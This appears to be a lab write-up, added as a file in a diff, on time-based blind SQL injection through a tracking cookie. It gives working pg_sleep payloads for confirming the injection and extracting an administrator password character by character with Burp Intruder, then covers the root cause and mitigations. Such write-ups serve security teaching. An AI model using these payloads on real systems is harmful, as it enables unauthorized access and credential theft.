@@ -1,0 +1,102 @@
+Blind SQL injection with time delays — information retrieval
+
+Lab Difficulty: Practitioner
+Vulnerability: Blind SQL injection (time-based) — information disclosure
+
+Summary
+
+Short version: the app trusts a tracking cookie and sticks it straight into a SQL query. The query result isn’t shown, but because it runs synchronously you can trigger pg_sleep() conditionally and measure response time. That lets you ask yes/no questions (is the admin’s password length > 5? is char 7 = 'm'?) and extract the administrator password one character at a time. Classic time-based blind SQLi.
+
+Steps taken
+
+Logged in to the app and opened the shop front page. Then used Burp Suite to intercept requests — specifically the one that included the TrackingId cookie.
+
+1) Prove time-based injection works
+
+Intercepted request had something like:
+
+Cookie: TrackingId=x; session=...
+
+
+Sent this to Burp Repeater and replaced the cookie with a payload that triggers a 10s delay if a condition is true. Example (URL-encoded semicolon ; = %3B):
+
+TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+
+Sent it and the response took ~10 seconds. Nice — injection works.
+
+Tested false condition:
+
+TrackingId=x'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+
+Response returned immediately. Now we can distinguish true/false by timing.
+
+2) Confirm the administrator user exists
+
+Checked for the username:
+
+TrackingId=x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+
+That request delayed ~10s, so the administrator row exists.
+
+3) Determine password length (boolean by length)
+
+To find how long the admin password is, I tested increasing LENGTH(password) values:
+
+TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password) > 1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password) > 2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+...
+
+
+When the response stops delaying, you’ve passed the actual length. Doing that manually in Repeater found the password length = 20 (the point where >N turned false).
+
+Tip: you can binary-search the length to save requests, but for short lengths manual incrementing is fine.
+
+4) Extract characters with Burp Intruder
+
+Manual character-by-character testing is slow, so I used Intruder.
+
+Sent the request to Intruder.
+
+Replaced the test character with a payload marker. Example for position 1:
+
+TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+
+In Intruder → Positions: make sure only the character is marked (§a§).
+
+Payloads → Simple list: add a–z and 0–9 (lab hint said lowercase alphanumeric only).
+
+Resource pool → create or use a pool with Maximum concurrent requests = 1 (single-threaded) so timing is reliable.
+
+Start attack.
+
+In the results table watch the Response received / response time column. One payload will show a much larger response time (~10,000 ms) — that payload is the correct character for that position.
+
+Repeat for offsets 2..20 by updating the SUBSTRING(password,offset,1) value and re-running the Intruder attack for each position until you’ve recovered the whole password.
+
+5) Log in as administrator
+
+After extracting all characters (all 20), I logged out (or opened the login page) and used the admin username + recovered password to log in — success, lab solved.
+
+Root cause
+
+The application concatenates untrusted cookie data directly into SQL and executes it. It doesn’t return query results or errors, but it runs the query synchronously, so time side-channels (via pg_sleep) reveal boolean outcomes. In short: unsanitized input → SQL executed server-side → time-based leakage.
+
+Also: the app exposes database-specific functions (pg_sleep), so it’s PostgreSQL and the attacker can leverage DB-specific behaviors.
+
+Fixes and mitigation
+
+Use parameterized queries / prepared statements — never build SQL by concatenating untrusted input.
+
+Sanitize and validate all cookie and user-supplied values server-side. Treat cookies as untrusted input.
+
+Least privilege for DB user — the DB account used by the app should not have excessive rights or access to functions that can be abused.
+
+Detect timing attacks — add anomaly detection or rate-limiting for repeated similar requests from the same client/IP and alert on unusual response-time patterns.
+
+Output encoding and minimal error/message exposure — don't reveal internal info; but note timing side-channels can still leak info even if errors are suppressed, so fixing SQL construction is primary.
+
+WAF / IDS rules can help short-term (detect pg_sleep, suspicious SQL fragments in cookies), but are not a substitute for proper parameterization.
